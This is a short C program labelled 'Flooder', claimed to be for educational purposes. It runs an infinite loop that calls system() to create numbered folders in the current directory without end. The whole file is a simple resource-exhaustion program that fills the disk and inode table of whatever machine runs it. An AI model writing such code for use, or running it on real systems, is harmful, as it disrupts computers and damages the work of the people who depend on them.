/* Programmed by Jenkins Shubham for educational purpose Only */
// Flooder
//  This will make infinite number of folder in current directory

#include<stdio.h>
void main()
{
	 int i=1,j=1; char c[99];
	 
	 while(i>0) {
	 	sprintf(c, "mkdir %d", j);
			system((char *)c);
			j++;
			i++;
}
}
